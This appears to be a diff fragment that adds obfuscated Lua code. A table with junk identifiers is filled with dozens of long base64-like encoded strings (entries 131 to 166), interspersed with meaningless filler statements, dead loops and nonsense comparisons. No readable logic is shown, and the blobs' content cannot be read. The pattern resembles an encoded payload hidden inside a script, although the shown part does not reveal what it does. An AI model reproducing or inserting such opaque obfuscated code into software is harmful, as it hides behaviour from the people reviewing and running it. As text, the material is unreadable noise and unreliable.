+_lGHIJKLMNOPQRST_0oabcd[131]='57y8vuP56qD86MzbxOng+836ztHn4KTz8eDO3Nvkw8nju87ZpPuywaTksqTZv77BxO7NvuH/7uW93r7D2bikwfjuzPvn47zc2NPRzMn7w8n74NHMv9i8xP7R0snl+s25/7Pp2eG4s+PvpObzuvvSzLr65vPnpNL72f/Nwc3hvNzZ+tKg2tHD3Pvg7qDb+sPM5Orp3Lj/v+b/5e6gxNHt/tngvsns3qTM7NLuwf+k5uXnv73B+Onuyefs6fPN+uD7+f/toLvfvcPt+uXuwurgvqDes+bv+NGgvvrg47Lj0qDK782k2NPp87nezvuz7by+wNG8+7q4v+Ps09G5suLM7ueyvP7+6r6g8ePl0eTvzO35+ODjzeWg7cTS0tzm3unj/+PRzO/l7sn97Mzj'
+_lGHIJKLMNOPQRST_0oabcd[132]='4t7uoPjp7tvC0enBx//uvsTRv7644+bju9nm0+W96u3O6uCgv+nu5u/+zdvlstG5yeXlzOjRzNPH+efbwunq5vzeoNzE78zR+eTD4/3goP7s6tLm4tHM4+/46tu65eq5vPjRufzS7r6/07/+8f/SoMrS6fPm7uDmzt/npMTuw+7b/b+g+f3l89mg5bm8/r25/t697qT95vvb++i++7/t0eDv5fvJ4KDM5/i+vsLqzaTE7uDuudrOoOzo0cTa082k2eXm2ejf58Tb/uDu8/nmw/P4zaTfuOnToO3q0f+86f746enTuvzDvvvzztnl/cz74bzp3ODZzLi4+8yg2fPloOjew/7o7+XJ7buyoNv7vNnj+77zpOLgyd+/6qC90e252N7gzPzYzsm57+jZ'
+_lGHIJKLMNOPQRST_0oabcd[133]='uuXvwf/h5tHH473zxNnM+7PpvPPls7y5zeXnvvm45vva076k4O3OvuP/zP7vvNLj++LD2e+gztzM6dLMudi95s7p6qDv/dLc/NHNzM3g6ebt4r2+ztLp4/n80r7/+M25+6Tl09m8vP656u+5x/vO+83kvMHhv+7MpOTu49/jzaC6+Orms9LMuc7o5rj9/uXB5b/O7r7/7czN5Ojc/ePNzPzq4P75pNHDudLpzN/5vcH/5Oe+4tLq+7jivObJ+u7l7/jq+/3jzP3//eDZ5NHmoOPgvvPu78z9/fm93Lna6rn40czBsuTRxMP6vcPj/rz+zt+8/vukzb653+bM//O8wbPp7dn+3szZzf3Rybr9vsns0enm7u7pueeyzNzN4r7J4//qoKDow7n9/b/Z'
+_lGHIJKLMNOPQRST_0oabcd[134]='5/rDweHx4O77ss7J6Onl48nkztnv5c7+577g7rz45cyz6L/Zv+qk5vmyw9G96Oa56NPNyc7e6e7a2dKg+ujg2cLTzMm76czt+b7N88P458m72tG54bjo3O/46ePh+dG5uvrmoMn76dGk49HbpPru26Tkvszvsubz7eDRyc7Rssz42L7Bv+3mwfm87bny2czZ2um/zOPh5sHH4s2k+u7O2d++oNm92cP+7fnD7t/gvMzN5e7T/ujD5vjT6ebfvNLJsvnO/u35ztH40ub94fK+xO2g4Nzg0dGg+ti/2eTZvcH//9LMsuzMvrr55cn/s9Kg++O9+8n96ea/6b3Rv+i82eDZw9na7c3b3/nvw7/t0cTjuO6gv9jl0+/j6czfpOnE8/3RxNjS6tnz5Mzz'
+_lGHIJKLMNOPQRST_0oabcd[135]='8tnludjTvPPj7OrMw+O8oOG9zu7E0uW5uuO87uTYw7ng2cPm7/PO/srR5tvx4s3E7eLDxPLe5cy+4+r7s9O9/u3hv/vg6tHJvuTt+7PSvMnhu+m+2u++oM7ovO7j4r7E5+Cyue7Rs+bD7OrMvvnu48ra6vPk2unz46C8oL7kzu7+3urE/fvDvsPi0r7foMzj8/7p4+Hl6fPk2b2+u9+8xPP9zP39++3Z4bzgyeO46cy/79L+2frlzOLq6cns6rKguqDNoPv65dzg06TE//vM/d/6w77h++a+8ujMvsP6vsy77+rt2ezp3OP6vf2k7Onjw/jmwcn56cHi6OrBvei92+LSv/7g6Oq52NnN8/ro4Nny0+fE++PpzMfi6tHs6ry5++K9ybvezaT+0qC5'
+_lGHIJKLMNOPQRST_0oabcd[136]='5O3p2djZ0aDhsu3Ru9Kzyd+/6uby7725svnt2f7Tzv6/6MPJ8eLlyc7uztz58s2k/+DNue39v77nss3M5eG83M35zcPs7tLRvuCz7v3/79u97ebM7fO+oM7v7b6k473usuLN877/vdn7u7y54Ojgvtv90b77uObE++C9weDT0fPh4Orb//zqzM3jw8G6vrLE//nq/eDv5v3v49LM8tjM2d/6s8n+78zB+fPmvrvR0snx+b39v9PRyezv5bnZ/8Ogzf3muO3658nm2bzc7+Dp7vrT4OPC0ue+4/rp3O//6NzN/87csuK9/rLhv+7j+c3M5unS0d/86tnluLP++fPMybne4Nm6/b3E6N6g48To57n54KTEs9i/vvm8vaDt4OnB2//MxOPi0bnl+73l'
+_lGHIJKLMNOPQRST_0oabcd[137]='w/3lxPzT7u6k/c3J5fjM5e/yw8nY0eD+7fnooPvjvcG977zJ4OjgzPzRzqDA6ubBzO292+LTzsnn5b/Z7eTt7vn9veXju7P+yeDgzNrow6DK7+nj2OjpoO285rn+7725zfvDuf7pw9O8+ebl7O/MyeG/s9mk5eru/OjO5rz+zNPh5aDRzu/D/vjZw/P55L7zx+C8+7rl5szH/uW+4eK/oOW+vb7b5KDcyeLD7vH9ve7E79HE2+Xu/rL9vczB+eDc7Ni98+Pzv/7j+uWgvP7NzPra6sTj+9Lj46TR2+H77tvZs9HBsuXD2b76oKC56qC5wOnmoLvq6Ob+2s24+aTq7cTp5sHO0qTR+7jqxMfk6ebN5O3Ju9KyvuzS0tzO6L3c7Oq9vv3kvPO+5Lzj'
+_lGHIJKLMNOPQRST_0oabcd[138]='777NuMDe6uXv477M777t2b7lw9no7ubzs9jmvvHj5vvb4uDJ8urO2droztHB+e3zyt7p7tjp6cS92ercyeDl2ejRoOPJ4ubm4frNpLq+5tnZ+tLZ+bjS7sLSvcz/sr/Z//uzoPnjztzn++3+pP3RyeX5vNnv4tL737iyyb/azbjb4L2+uv29xOXhv/7/88zM7N/lybry6ua65Obu2eCg3Mnkzu7noODu4f+8vuf96b7x4+XB/eS8vsDZ5vvt8+nz/+HnpKDt6dnA0bzzzNLmzObq0cHm6ub+ytjpzLri5aDA0r+g/eCzvvLS5uX5++Xz4f/pzOXi6fO73sz92OrmoOWy5dPm7cPm+7Pq5rPe6sny0u6gzunD++H66Nz637zc2+Pm8/n6zNzb+Mzl'
+_lGHIJKLMNOPQRST_0oabcd[139]='7+Hg/tn+0fP+2MzB373S2eDS0u763+a4uP680+395szZ4LOg7bjRwf/6zMz5/dL77biz/vnj5vP9+cP75ePM5c3j6dHl4eDJ2NPp0/m+s77D4O+47u/nufnyvfPn5LK5+fO9/uLYvczfoMzm5Oi8zKT/5sPH/cz7pODD0e3hvdG92MzJ4eSkxPvz4Mm+5Oa+yf+82brk6cn/v8z95fnqvubo6dzj4ry5ud/m/qT7zub7subRvdLu7aDevLna6e79+b29/rnt6b66483D2f+/5uO7oPv7pOnR77O+ueLY5vPZpMzbv+7RyezY4Nnm0czjsv7MoPP77sPloLzTs9/m5efl0v7H4tG4//68wcLSs6DZ5ebB2/jqw+WgvNnf/NL+2/q93O3l6aDi0bzE'
+_lGHIJKLMNOPQRST_0oabcd[140]='uOSzvuLeoO3i0u7l4b3OoLz75tz60enM4bPq0eG4zaS8/8P+2Ojq+8rozMP5vsPR+trS5sza6bnf+6DtudLpoP3778Py6szj7bzvucLqvcPZ4ObJ/+Hg/rrs0u6+5aDt2t7qwdjp0v7ZuMPjztG/vvjZ5qDjuLK5vd7M7aTkvaDZ/+r7/tLq0+3+veXj5dLjwfu+xNvizNH58ubB7+W87v7qvdzC2by+2+W/47r5zcHvu+Dc+tng2b/v4Mn/8uD7u+2/oOTZzbjf+rzcwN6g3OTS7fv+6czM7+W888De0qDH/8PMwuqyue29s+7hs7zRyuru5dvk5cTt++7Z5fnqw83+vPu/7cPmztPuw+3z58Pn/erR5u690+O47vPj8tKgurO9uMHg5u79+rzB'
+do local I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno=519 end
+if LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ~=_1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx then else end
+_lGHIJKLMNOPQRST_0oabcd[141]='5eHg4+GzvL797NLZ5+Ln8+jZvb7O7cyg+ujg3Oez0tzls7zEv9+/5rr/6tzA3urR2Nm95uO+w+Pv/9LM7u7S5szq7sP94ODc/O7D5u//7ua6/r7B8tPnybL/w8zj+7Pm5f3M2frqzcG90cPZ+f3mzLr9w+6z0ert3729we/57f7D+87+57+/4+jtzb7f4b3Tvd7l4+zYzOW76qTm//Lqwe2zvtvv8b7B4tnD08TZzL7j/rzT5b/NxODpw+774OW+s+rMxOP+zPPfs83B4NnO+8rZw6Cg0urj37vM89rS5ubH+qS+77PS2ebR0szN/+XZ7u/u/b3YvMzO37zj8/nu48Dq7sm+4+rl4uq+uOjtzfPl/M255b7vuP3h4O7s6e3zzeK+uOfk78ni2ebM'
+_lGHIJKLMNOPQRST_0oabcd[142]='/ujS7rj6zMTB/86g7OjS/vukvrju6NG4yeXt7s3szv7A2czu5ePO/t/k6cHD5KDJ//PM49++oLm68s7c8ePNwaDuvvPnvsyg3/jl+7ri6e7N/7zZ4/vNyeLv6P7J+++kw+S9ub3S6cnB7NHb8u2/7r/ovsnO08zRuuTRyfuy7vP87b3D//29uLrjzMPy0szuwtLRxOf5zcP/+LzTx+PD5rPp6sPN/uXTzeC929/szuPb4O2+wfvg+/nks/7/5ea5uejNuc3sw+7z/ubM+6C9073v5e7D+u3B8tjgyd+7vbjfvbzu+7Ll8+fz5fP/+Lzczf/D5v/7ssT82efbvdHp5s7evLnN7M7c+b3mwf3/7b7D5KTzzurM29nszcPE3ubT8ezRweO75tzg0r7b'
+_lGHIJKLMNOPQRST_0oabcd[143]='8t7R8+fjveXv873jwOrSoOGk4NnK0sy4udjlzM7u59vloLyg5O/Ryf+76uX/ve7T2/7m2b76ztnm3s6+/N7M3Lz6vKDH477Myt7twfPkvczv+L25vd6g48377u3/sszb4/3g7rzlpOP+0+2556S8+7vTv8nk6uXz8/vu0+H5vdHz+u7lzurO2b3R6f7+3+b77+G+wbrj6sntu+3+4tnm+7vT4OO76c7cztHSzO346cTZv8zbu9Lu8++/oMny3r/Z7/zNvr/ZvMn87+6+5uno7uOz0uPB4+rcw+XtvqT/zty++9Hb4ui+yeW87aDjvrzJs9HDvvzZ5eP/4s3JoNPl++jS7rna2L/u47vu5s356rmz0ufE2O/l+/3/zaDv4sPzuvO82eO/zMzZoOWg'
+_lGHIJKLMNOPQRST_0oabcd[144]='vuLO2eX+vL747r7JxNO9xLPuzczl+OX+/O/D5s375e7m2NLZ2+DqxL3Y0fPs0uXJweDDoMDvzKCk+cP7++Xn88Ps6r7lss6+/NHg3O/9vNzx5erM4+HnuPLtvePhoOncvejO/t/szL7+0+XRvv2+29n/w9zE377D3+LR2///76Da3rK52fHnvv3l5sTZ5dK+ztjM8/nzzvvZ5cPmytnRuOLv6rnK0ej74bzmw+P6zcG85OXmvPjq7rvo56TC0uD7u+m/+7j5vf665c7m37LR287S7dm/7dHE5ui/7sLSvNPb5bzEuPjqw8HlzLjN+r++4/jl0/7S4P7J5M7c/NLgye377fu4+L/M5eXm+//9vf3a6OX+sv7q3M3ivNzs773+7N7m46T6zOP/v7zu'
+_lGHIJKLMNOPQRST_0oabcd[145]='5b6guKDp5tz40eDJ7tK+w8LT6v7y0eW+5tOzzPjes9m/3r++2+XnzOW9vsPk0unEx+TnoP37vMzt5NL+oN6g5uDe59uk+ODms9G/2bvZw9Hf+NKg5eXq2bq+vMm97ufM8urDyeHi0aDM7enB4+Lpvsfg0fPv4+egyeLMzOjR7rny0cO5sv7l4+je6cTY2enE4aS946DR6cHvoL3l8/7D/t//v8z75b6g/NLpoOTtzczJ/tLJ//HlzMLu6qD7+czR5+Xp2b/ozdu6subMyezp3Lzls8z5s+DM/O7S/snk5fuk4M2k+u3M5uP96sHj5aSg7//RpP7Tvdzh4M3M4+Xt3Nn7zcH9+8zJ5O7lyczSs+7H4NGk2f7noOP46czy2eDjx/3SybnovdnloL/m'
+_lGHIJKLMNOPQRST_0oabcd[146]='8/jpwfPj6dzj+LzJ7N7lzLL7w+a96qDR4fK/zL7jzMTE0+r78f29/fzv4NH/4ObB/ujRxLLiv+Px+MOg5//qyfLZ6vv+6dL72eK/zMn9zLik+Onusv68ydngzaDt+7/MpPq97uHz6vv7uKS+zurSyefs0tn/8bzE+/PO2cTu5v3D/byg7fG8oLPa0uPZvs3B/fng2aTszbj67cPc+fnNxODt6r7O0aDE77jNzLPSoPP74MzbvvugoL3o4P7K6MzM5/PM08Lp7czO3+bZ7Onm7ezfvr7H7NHEuvPDubq86r7j4b/ux/rMvsf/0smy/ue+vv/Dwfu/6sH62Ly5/f/toMrSv9yg6e+4/N7p2fjZv8zx/b/M/NLp2bL77cz/s8zT+NHu26Dezbi6+Obj'
+_lGHIJKLMNOPQRST_0oabcd[147]='vP3pweDZ0tnu7uC+v+jm/cro0bm70tLm/frq0+e+w/O96LzZ8/6//uP6oOPH5b2g/+K/oOjTpLm708zcuuK9/cDv6rj7+u3j7t7D7vP9vObn+erZ8tHqoP/lzNzh+My5+tnM2e/l5aC/6qTZ5tGkydjq58nB+ea+x/qk5t/szLjB4unM5+Wy8/3+zP7z4ur98frl/v/l5czi0urBx/rvwdjT56C4+cPzweW9/r7j6rnH/b/m2+Tu2+Pk0aDY2Om57b+k2aT4w8H/4Om+8+PMuc346tvv5e3u7/jp+8Pk7ub46ue+2/7g5rLszP6k/+7c5+zqwczozKDh+eDu+b3Nuc3g6tug2czMu9LO/u3izsn/+OXc4tPm2fv+w8n95OrM5u/OzLL76Nnfu6DE'
+_lGHIJKLMNOPQRST_0oabcd[148]='zt7q/vPk5szA0aDE2eDqzNjq7r7C3uDZ5+PS3PmkzszD+cPu2+K90bPtw7ng0c7Jzezq27PSpKDi0tLM477S5s366L6z6ryg//m/5vLu5u7l+b3Zv9rq88H+6ub63s7msv3Mw6T9vqDj4r3c/fnuue+75uXZ+Lzu+7i/2fmg6e6y/+qgwuq8zOWgv9y4+bzMzujp2cf44Mzg7er+yeXp/trTvNz74OfB8eW97qT758H7+tHJ8ePMw7rzv+7juL/mwePMyfP70cHO6L/M7frp5sn46tnx+urb8+zqzNrqs8n47uXMw+Sz2e3k6bno6OrmxO7l+9v4zubH+L/Mu9nlucP7vOak5erz+eDg/vjS5b7J+czZyf/m7uTa6vPD47zE4b7MwczZ0fPk7urz'
+_lGHIJKLMNOPQRST_0oabcd[149]='+bjNzPju4KDv+Ob+8/+9zNnivMzD/83zpOLq2ejqvqTg3qDZw+Tn28zuvf774rzZ7OjS3Mn+vPv/+Lygzu7mue/46v7k0+bmverMoPm85rny0unjpP3q7f/+6cGz2eWg5bzpxOH5zMnfuObT/7vqufPkpMHx+83MuvO8udrew8H5ssPBpP3SzPn+5aDt8uXM2NPm2bnfvszA2urMu9POzLL6oMmk5ebZuPnMufPlsr7//82k+OrvucHlztnK0u7z5unR273qveP/suegu+jp3KT6zO363unm+b/l2c7Y6vu8/um+8+Hm5rnSv9nh+OrJ/+zq2fP5vdzC2enM4+XuycTe0v7x/dLJ8/i9ucrq6czE7+7tw/vpoMnks8y4+b3z56TSybvo4MzZ5c3b'
+_lGHIJKLMNOPQRST_0oabcd[150]='yt7D2cTZ58G+/c778tLSybj6oKDj/73z4+TNxPzo58yg3uXZ7um806Tg6qDvs+C+7+Tp7v3hve7t+u++zfru88ns0sz74KTZ8uqzvr3pvb7A6enJ5+XpzPuk6dzH+efMuOXnuMn6zv7+2OnM/+TgzO2gv9no0dLM5tjR2//56dnC78zcwu3pud/64Mza0b3cuvvtzNnkzP3J+ub7/eXq88P6w+bD/+qgsuXp4/m9zPPh5NLm2ujM++zY6bnZ+uWgsuW8zPvkpL767urm373moPzS5dH55O3z5O3g3P+/v6Djs+XT4eO989ngpLmk4NL+vejpzPHg6Nn747/Z/t7NxPrvzuak5ObJ4eSz2fP70cy++Onj//nmoL/e6dnz5b6+yeK988P+vMHk7r3R'
+do local _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=409 end
+pcall(function()end)
+do local _={38,32}end
+do local _={47,34}end
+_lGHIJKLMNOPQRST_0oabcd[151]='2Onu7cnkvMm56eXJ4/rR88rS6snO37zc/trRxMrSv9zv+unmw/3gzMH4zqC+47zE+/7D0bL90ub+0szZv++82f7Rzcnv8efzve3q/uDo5dH9+szju+2/3M3lpNnt/M7u/ujMoOjq6My72un+w/3D3OLp79vN5eXz5NrRueW4s/75vu/b7ti987/u58ng6cP+5aTD7vP/78m/2tHByeG90bvazNnD/8P+7bju7b3vzMzhvs3EuuSg/fra0r7J+Ob+5tLpucHl0dvy6r6g47vNucn+5sn/oMz9vOLOzM7es+6y4b643/q8++TZzu7g0sPM5fjlyf/7vPvt8sPRsuTg3M7q57mg2L3B4+Ll4+G8w8Ta3+b94+W95fzZ6cnfs9Kg++G92crRzL7o6r7E'
+_lGHIJKLMNOPQRST_0oabcd[152]='7f7MufLq5tzx47zu8eDS+/3iv6Dvv+Xc//jM26T+0tng6uXu6NrqwcDo5szz/czz++TO5sP7vbn62czBzOjS4+DR0tzE0dHByf3pucnj5aDz4NLM/tKg0c7v5uP40b/+8fm8oPHg0aTg6M7Zzu/tyeLf5uWy+qTJyfvm5ezT4P7J/c7J7bPq3Mrv0cHt4by+8unOzMzt0b7b4b6g2eSzzO+97syg2dLZ+fLq48LR5ebu7dHB8+zSzO7a6cG44s7Zztjq7b7679vl7Orl/+Dm+/zS6MzN/83Mx/vNoOXjvf760tHB8fro/rLkzPP80sO537jSzLz/5rn/5eDZuPngyfzSv+ay+uq+8tjp48row7nJ4Oq55buzoObYv+7voLzB2eDD++Lp7eO96rzc'
+_lGHIJKLMNOPQRST_0oabcd[153]='x/rMw/my5dza6uq+vd7D46Dvv9nn+9HJ/u7q/b/e6cmy+Omguv7m0br5zOXh47/+8/vSzOP55u787b/Z+aTR28Hjvczb5Or+8frgzMP5vszz/eX75frooPju6u26+L/7xNLu3Puz0tzj/87uwO3Rw9rvvcPnoOrcyfjnub7k7cHk7cz+7fuk+/nk7tzA6ObM2f7RybvozqDv+erj7/2/7qTgvOPl/7zz2u2/3O/kvdnn8r/c4OrmoPjo6vPj+MO5udPp+9vk6fPj883bzO29/c7YzuO70bPu7eW8ufPk6aC6uOnE/7+goPHg5eP/4ur9urO/7vLp0vvA077DsuTq2cPgvrm++86g4/jnpOLY6uX5sr/u4bvM/qT46vPK0e3BweK8yeXlvf7h88Pz'
+_lGHIJKLMNOPQRST_0oabcd[154]='w+PMzPu4zbj47s7mx+XDzMzR6tvn+NLuwu/qoKTjvvPZ4M3Muv+98+XhvMm93uek8fjD+83g6cHj5ejcx/jNvsDRzsyz6r/Z5f7goOXg5cy90u3B+O3M/uH77r7x+OrJ2+S80+P77eb86cP7uP3m5t//vMzlv739pPnv8/P+vdzK7sPM4NPS5r7g6rnx5erJ7O6/zLPv7uPK6NLcoNrq/fLu4Myz7tHzxO/M4/PgzcS52OrT7bPl5tng6sn67ebmztnloMrZzuag2NHEx/28zLnoztyg0+/M3/2/5sPgv+7t482k/eK9zP++vOPt5eDM+eDm89/k0qDhuOnR2/nOycf66e774urTzf28yfjpw8zB483bvPnnzPzR6cTg2NGgw/vOzPn4zMPZ/Oru'
+_lGHIJKLMNOPQRST_0oabcd[155]='5eTo48P5zNHK6r/MuOPg3ODS0bnm6NLjuPvpwcHkv8z7venz47uzzLL9v+760r655fvD/tjTv8zH477Bwu3OvuLu6v7N7NHb7O2//rvR6aDh883J4tLmucTv6r7N/+a5sv/pzPPsw8nh47zB5bPRvvu86Mn//b3c2unS/s7SvMzlss3z8/vvzOTSpMHz4rzE+eDS3PrR7bn7oODMuP/M3Mflzsz7473Z2/jS5vLuzbn+3uqg/eO98//izcHO3r3EzNjRw+Xj6tvj5dHEu9jmucP5zObN+Lz7zO/pwcDY0u7J7Onjw//moOfhvOPY6NKgzfnDwaT7vO7+0+jZ+7/p7sf/w9zJ5aCg2eLRoOLv5czt483b+/nDoNmk6dH7uMP+suW85uH4w9ng6L2+'
+_lGHIJKLMNOPQRST_0oabcd[156]='4O7NzL3ToMSz6L37s97RwbPp7sTj8urDweDDoL/Y6vO77rz+5+O+yaT/5sz7+b65+by//r3vw9zf+83BpOS+w+O94Oay+8zu++DNzMLt4Nzy3umg+O7p+//+zMH587zmzuqyvv7ew+bY2LzJuvrlufzaw+bm6eXRyePRydm+w9na6LzB4fq+2+P/6cHa78PR8+zO7ubo6tn86ObZs9Pt/qTs6u346ODJ4NnDubr75bnh4KT+sv3myezpzOXfu87c/tm+oO3lvMHm3unRwf3mubLhvqTfv+fB7b3loO2kw9O44uru+/7puebvvMzj4ObM7/292c3s0ubB+6TZ2N7p0frp5rji0ubt4NHDoM7ozuOy7Orb8/rMoPPs0ubJ/tLu/+LOzKDZ0sy77ea+'
+_lGHIJKLMNOPQRST_0oabcd[157]='56TO2b777sns08zJsv6/2e3j0sno2szmw/jS7uTS0vv80ubE+bPq+7j50tn86OD+7+Dq49v5ztG8/erM7NPgvuPk5dHE6M25//i/5vv4vdng0ufzx+CgoPrazP3lveXB/O/myfLT0sy64r/JxNHgzNrqzPvi0czE37zRufrSzO3k0sPEsuzN2/355cng7r7B/7y8oMfg0tmk+r657tLnycrpw7n/vrPZw//l4+ez6cyg7r2+47jt3OXjzbnK3s3D4+zq2djRpKDE0u/DzN697tju6tPD4Orm4b2gzOX5zMHs7dLm4NGkoM37vtvn8unc2f/D/v/g5bmk48zZ8/2/7vzo5cHB++3Z7u/Oye/g7fv58+XEpOPRxO27pObD+73BzeK928DtzLnx4LPR'
+_lGHIJKLMNOPQRST_0oabcd[158]='+ePnwfu86u7g0urExN7uw6DRw8HC77z7ve/lvsTe5v3t5LP76NPqvuDevL7Y2L/ZvOW9zO/lvPvD+Oe5wfrtoMzTpMzN/umgzu7p88P9zr664OXB+bO+oMP45rnlvMzm2+C98/+9vLnj4tLJsvqg48rZ6vvJ+r/u8/3qoPjS7fv/+M6g+Oq847L7w+bH+cPm5+Lp++Lvv9z947/uyeTp08LS6qD83r3u8tPM/r3pzuPy6b/Z/7K+uOf9vPv/4Om5w+PD8+P5zKDg7+Xm7eLDyfPk0ua50r/M/Nrp/tvj6uO8/bygzf3q/u//zNO4+cy44frSoP++6cS90dGg7ePOycn56bnhvebt4bigoNn/w+O57uqg8eK8wejaw7n7v7zc8tLv2/nk6ub5+b/+'
+_lGHIJKLMNOPQRST_0oabcd[159]='4bvMzODS6Obx4ODZ6O3S+9v45b7x/b3t7+Tt877ivL7N7Mz97/qyybz4zv7O0aTE2tHMxO7ezMza0uDM4/rD3N+/zPP62cO5ztLgvt+94MzE6e3M8f3lue3zw9nO6rzc+bLRuPPgztzy2b/+/76gxO/g5fPC6L3m4NO/zLPp4NH47ue45+Xq2ef7vOPt+cy5pPjS0fP+6sPN4sPMvenq7cfl4L7s0c7csv3NzOjozuO4+sy+yeXl7r3q7szJ+u3Zzu7S5s7ozLna6Oq+2fnmw+OkvsT5887J8fjmwe/gvcy707zJvdG9xPLvzNP62L7Mvv7q2b7gzqDD/c77yunl2dm76sPD7Onuv+/Nud/5zMH5vLy54u688+je4OPf5aSgvdi/3OLe4O7a373z'
+_lGHIJKLMNOPQRST_0oabcd[160]='/fi98/Pi6dHD47zM8eO8vrz/5ea92urz4+CgyfvjzMz74+nMw/3m7uP5v+bN/c2k+eTu877/0u7jpMzmzf2989vjzOW77bzcve3NzMP5w+bJ+rzuwezq/rvqvPPv+u2g8fjn2+Du0v7B+7PM/O3M+7PYv9nns8zMve7NucngoLjD/b7D2unq5qTkvNza3rLzx+SyzM7a0cHo2M77pOzRwfv65ubo2bzE2bPMoM3g5v7h4tLZ2/6+ud+yvO7+6rLzyf3RzNm/0u6+5MP+/OrvvsTZvf257c2g/eO/oKTi5dzN4+rb5ezRoPPjzsnD4b7zzeW8wbjiv/7j+qSg5/PDweX7w8zC0erz2frRzP7Y5qDt/b7Mvv3nyf36oLnH/bzm++Lp5sn/vrnD4M3D'
+do local _={86,59}end
+for _=5,1 do end
+do _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=_1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx or 838 end
+_lGHIJKLMNOPQRST_0oabcd[161]='8fjSzO366e7J+rzJ5fvt887a0aDl+M7Z8/7S3PLRzMzD+u7l8+C9zOO9vfvB4bzc3/rqzO/4w77ju87c+7ikwb7/zty6vObZ4OrS/sf/zMyk5b7J5fnNoOe9vMHz4OrzuOK95qDa6tO706DB/u7S7qT67dnN/83B/NHl/v7S0cGy/rzMyfnnuPvivqDJ5ObcwNHD+8To6bnf887Rx/3N8/vj6tm8/urMyfrD5rLlvrnz4My+++K92cP+56Df48zt3/vp7uXy6szY3rzm/tjq0f/4vdv/s9Gk2+K93PjRzsy56eXz5ujpufvgoMT5/by+vOO/7uPzvMSk+szM2trq86DS76Cg3r/ux//uzP34vcG/6r37vP3M/cLqve3g08zB2Ni9wcze6qDnvuXB'
+_lGHIJKLMNOPQRST_0oabcd[162]='6NjM07L75b7z4Oqg+bztwbjj5/PB+MzE5/m95fu+4L673ue446DD7uH67vP60bK4pODl0eG47e6k++7uu+jD0f+47szt/r/+5eCz2eDq78Gg2erux+DMuLr75tnD4KTj5/rD3MP/6snJ/+nmwNGg3Ofj5sTH4M25++LNpMfg5f7f+erR7tLm0bvTssm44bzM8unDydmg58Tj+ujuw+Du3Mn7vcP7uL3b/+Xuvv357dm56ej+57jRuezf577ZuL/+ur3p3OHyvf3/8eDM5/K/7rr9zcSy5O7l37Lm2/3+58Tk7+7j6NLD7srp0szm0cz7vuXRxO/yvcS45MP+4tPu0bnS0cS8+7+g+N/g5vv67u7n+u3z573mxPjTvaDD48zu+fm//rve77js3r3j'
+_lGHIJKLMNOPQRST_0oabcd[163]='wtK9w9re0szK3umg/u2+ucLY5bm64+mg+7Pg7tm/vPP43rPcue7pudv55f778+q4+NHp2c366uaz6Oru+frm27LkoP3Y0qDRwunm0f3/vdv82s25x/jM29/4zcTlv+e4+fzq5fLSzbjE2cz++Onp49+86v3O79L747vpoP/kvdH86qS+pPrRzOP8zMPv8ur72tPovqT+5dPy7bzRzePO5vv+veP+6erM2+Lq0+TRv/uz3uek5/7MvsPl7dHhu7zM8tLl0fnizb7K0c3J//K83L7sw8nt+e7bpP/u5fjp6dz66ufz4+S9+8HszcPvoL6+6N7u0djow9PA6uDu/u3n8+35zMPjvNG4/eTgoPrv6f794uq+3+zD09/lztnl7MzT2//q7c370vu+4O7m'
+_lGHIJKLMNOPQRST_0oabcd[164]='udOgvvLYzLjg6eigw/3m7rnT4Obj4KDR+/687vv/zNnY7+DM4aTNuPLazO68+u7lwfvm7tje0r746LzR+frD++f/6NzN5OnM5+DDxPvg6e7j5O7mpP/vvuLepMTtvbzcudPuoNje5dz/u9HDuOWg46DT6P786MzZ+/Hlue7esszD/+nzvuPRyf7uzcnE2szD/tnRue7S5r7A2dHE+b3t2fPl7czx5e3B+fO9ueTe7ebA3r3BweXN2+LRv8ny7b3lzO/l87r/5tnlvszJ+bzqxLL5w6DE6ujMurjNwdjo6szY6umg57u90c7S5vPk0u+54O/vudrT77jK2eXE5unmxOP+zMTlpOekoO7S0eG86r7Y0s7Z5728zOXj6aDfvrP7w+LlzP3gssTf8urt'
+_lGHIJKLMNOPQRST_0oabcd[165]='7/Hl0e/+5f7K7cO+w/rl2aT+0v7l89G4/+zO5vHk7u6g6Oqg+bik7t//zr7C6eW52u/nycHhv+bfv8zbw/2//vju5dz86uXz7+DRubz4vdH43unT7/m+8/+/5sTD/s2+4O68xPjR5qDh/b6+373Mwf//6dnm6ebD/76+xO/yzuP5+6Tu5f+9oOLq56TO7cOg372//t/j5f7J/by+7O7g2b3pzO68+efEytHo+6DS5vO6/8Pu//qk+8H5vNHjvb7M8tHl7trTzsyk5ObT6OrD3M7Sw/vK78zT4+DuucHhv/vm6Obm/NjpoLPt0u7hu82+7ujMyfu/7sT63szluPvgydjv76C4+7258/nnuP3+zMzM6szRzfvRxO7vvqTD/r++/u/D87Lg5tzh+OnM'
+_lGHIJKLMNOPQRST_0oabcd[166]='4t68oP7ozbnC7uD72/+/oOPlzcPvoOeg8tjlwePgvdO90ebT2eDpvuW/7fuy5ObR+6DN8+Dozczj+erz77vq/srt6cy84+XB++WgvsDf57no3+XM8f7p/tnjv6D/5O7b472gzODY0bjY3ub97trNvr/p5tuy+7LJ//rp4+3k5cTZ/ufMw/m82bq8zP3Z+b3J4Onu2bq7w8G8/uXm/f7q/c3+6dzo6ufE7ti87v7o5dOk5M3E4bzD0bjl6tyg2s2gxO/qvu7qvcG4/bzT+urO+/jSv+7t4Ofz/+Sg89/z6vPD+7y54//vvsf7w9nvvO7+4+TmybvR0cm57r3Zwu/R287qzszH+8Pu/eK8877kvMHs7rzB+bzovv+/zPPY2b3Ms9G8/tv/6r7z+OXz'
